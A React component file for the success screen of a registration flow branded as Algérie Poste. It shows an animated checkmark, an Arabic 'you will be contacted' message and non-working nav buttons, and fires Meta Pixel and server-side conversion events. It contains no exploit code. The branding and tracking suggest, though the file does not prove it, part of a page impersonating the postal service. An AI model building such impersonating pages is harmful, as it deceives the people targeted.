
import React, { useEffect } from 'react';
import { motion } from 'framer-motion';
import { Lock, MapPin, Newspaper, Phone, Info } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { useToast } from '@/components/ui/use-toast';
import { sendCapiEvent } from '@/lib/capi';
import { trackPixelEvent } from '@/lib/pixel';

const VerificationAnimation = () => {
  const circleVariants = {
    hidden: { pathLength: 0, fill: "rgba(30, 58, 138, 0)", stroke: "#1e3a8a" },
    visible: { pathLength: 1, fill: "#1e3a8a", stroke: "#1e3a8a" },
  };

  const checkVariants = {
    hidden: { pathLength: 0 },
    visible: { pathLength: 1 },
  };

  return (
    <motion.div
      className="w-32 h-32 mb-8"
      initial="hidden"
      animate="visible"
      transition={{
        default: { duration: 1.5, ease: "easeInOut" },
      }}
    >
      <svg viewBox="0 0 100 100">
        <motion.circle
          cx="50"
          cy="50"
          r="45"
          strokeWidth="4"
          variants={circleVariants}
          transition={{
            fill: { duration: 0.5, delay: 0.5 },
            pathLength: { duration: 1, ease: "circOut" },
          }}
        />
        <motion.path
          d="M30 50 L45 65 L70 35"
          fill="transparent"
          stroke="white"
          strokeWidth="8"
          strokeLinecap="round"
          variants={checkVariants}
          transition={{ duration: 0.5, delay: 1 }}
        />
      </svg>
    </motion.div>
  );
};


const VerificationScreen = ({ onOk, eventId }) => {
  const { toast } = useToast();

  useEffect(() => {
    // Fire tracking events when this component mounts
    const customData = { step: 'success' };

    // Fire Meta Pixel event (Browser)
    trackPixelEvent('CompleteRegistration', customData, { eventID: eventId });

    // Fire CAPI event (Server)
    sendCapiEvent('CompleteRegistration', {}, customData, eventId);
  }, [eventId]);

  const handleNavClick = (item) => {
    toast({
      title: `🚧 ميزة ${item} لم تنفذ بعد - لكن لا تقلق! يمكنك طلبها في رسالتك القادمة! 🚀`,
      duration: 3000,
    });
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <div className="flex-1 flex flex-col items-center justify-center text-center px-6 py-8 pb-24">
        <VerificationAnimation />

        <motion.p
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6, delay: 1.5 }}
          className="text-lg text-gray-700 leading-relaxed mb-8 text-right"
        >
          سيتم الاتصال بكم لإكمال الإجراءات. بريد الجزائر يشكركم.
        </motion.p>

        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6, delay: 1.7 }}
          className="w-full max-w-md"
        >
          <Button
            onClick={onOk}
            className="w-full bg-[#1e3a8a] hover:bg-[#1e40af] text-white font-semibold py-4 text-lg rounded-lg transition-all duration-300 hover:shadow-lg"
          >
            OK
          </Button>
        </motion.div>
      </div>

      <motion.nav
        initial={{ opacity: 0, y: 50 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5, delay: 2 }}
        className="fixed bottom-0 left-0 right-0 bg-[#1e3a8a] text-white shadow-lg"
      >
        <div className="flex items-center justify-around py-3">
           <button onClick={() => handleNavClick('معلومات')} className="flex flex-col items-center gap-1 px-3 py-2 hover:bg-[#1e40af] rounded-lg transition-all duration-300">
            <Info className="w-6 h-6 text-blue-300" /><span className="text-xs font-medium">معلومات</span>
          </button>
          <button onClick={() => handleNavClick('الاتصال')} className="flex flex-col items-center gap-1 px-3 py-2 hover:bg-[#1e40af] rounded-lg transition-all duration-300">
            <Phone className="w-6 h-6 text-blue-300" /><span className="text-xs font-medium">الاتصال</span>
          </button>
          <button onClick={() => handleNavClick('الأخبار')} className="flex flex-col items-center gap-1 px-3 py-2 hover:bg-[#1e40af] rounded-lg transition-all duration-300">
            <Newspaper className="w-6 h-6 text-blue-300" /><span className="text-xs font-medium">الأخبار</span>
          </button>
          <button onClick={() => handleNavClick('الموقع')} className="flex flex-col items-center gap-1 px-3 py-2 hover:bg-[#1e40af] rounded-lg transition-all duration-300">
            <MapPin className="w-6 h-6 text-blue-300" /><span className="text-xs font-medium">الموقع</span>
          </button>
          <button onClick={() => handleNavClick('تسجيل الدخول')} className="flex flex-col items-center gap-1 px-3 py-2 hover:bg-[#1e40af] rounded-lg transition-all duration-300">
            <Lock className="w-6 h-6 text-blue-300" /><span className="text-xs font-medium">تسجيل الدخول</span>
          </button>
        </div>
      </motion.nav>
    </div>
  );
};

export default VerificationScreen;
